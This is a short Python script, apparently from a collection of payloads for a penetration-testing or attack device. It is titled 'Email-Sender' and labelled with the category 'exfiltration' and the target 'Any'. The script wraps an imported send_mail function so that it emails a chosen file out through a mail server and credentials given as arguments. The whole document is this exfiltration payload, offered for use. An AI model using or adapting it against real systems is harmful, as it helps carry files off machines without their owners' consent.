# Title:            Email-Sender
# Description:  Allows sending emails to a mail server, with file support
#               this is used coupled with the extension
# Author:           TheDragonkeeper
# Version:          1.0
# Category:     exfiltration
# Target:           Any


import sys
sys.path.append("/root/extensions")
from sendemail import send_mail

if len(sys.argv) > 8:
    send_mail(sys.argv[1], sys.argv[2],
                   sys.argv[3],
                   sys.argv[4],
                   server=sys.argv[5], username=sys.argv[6], password=sys.argv[7], files=[sys.argv[8]])
else:
    send_mail(sys.argv[1], sys.argv[2],
                   sys.argv[3],
                   sys.argv[4],
                   server=sys.argv[5], username=sys.argv[6], password=sys.argv[7])
